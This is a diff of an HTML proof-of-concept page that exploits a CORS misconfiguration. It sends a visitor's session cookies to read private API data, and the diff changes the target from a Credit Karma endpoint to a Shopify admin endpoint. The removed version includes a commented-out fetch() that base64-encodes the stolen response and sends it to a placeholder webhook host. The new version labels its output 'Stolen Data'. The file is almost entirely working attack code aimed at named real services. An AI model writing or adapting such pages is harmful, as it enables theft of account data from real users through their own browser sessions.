@@ -1,28 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head><title>CORS Exploit PoC</title></head>
+<head>
+    <title>Shopify CORS Exploit PoC</title>
+</head>
 <body>
-    <h2>CORS Data Exfiltration Proof</h2>
-    <p>If the box below fills with data, the vulnerability is confirmed.</p>
-    <textarea id="output" style="width: 500px; height: 300px;"></textarea>
+    <h1>Shopify Data Leak PoC</h1>
+    <p>Target: <span id="target"></span></p>
+    <textarea id="output" style="width: 100%; height: 300px;" placeholder="Data will appear here if vulnerable..."></textarea>
 
     <script>
-        var xhr = new XMLHttpRequest();
-        // REPLACE THIS with the sensitive Credit Karma endpoint you found
-        var targetUrl = "https://www.creditkarma.com/api/v1/sensitive-data"; 
+        // 1. SET YOUR TARGET ENDPOINT HERE
+        // Example: https://admin.shopify.com/api/internal/user_data
+        var targetUrl = "https://admin.shopify.com/api/2024-01/shop.json"; 
+        document.getElementById("target").innerText = targetUrl;
 
+        var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                // This displays the victim's private data on the attacker's page
-                document.getElementById("output").value = xhr.responseText;
-                
-                // EXTRA CREDIT: Send the data to your own logs
-                // fetch("https://your-webhook-url.com/log?data=" + btoa(xhr.responseText));
+            if (xhr.readyState == 4) {
+                if (xhr.status == 200) {
+                    document.getElementById("output").value = "SUCCESS! Stolen Data:\n\n" + xhr.responseText;
+                } else {
+                    document.getElementById("output").value = "FAILED. Status: " + xhr.status + "\nCheck DevTools Console for CORS errors.";
+                }
             }
         };
 
         xhr.open("GET", targetUrl, true);
-        xhr.withCredentials = true; // Essential to send the victim's session cookies
+        
+        // This is the most important part: sending Shopify session cookies
+        xhr.withCredentials = true; 
         xhr.send();
     </script>
 </body>
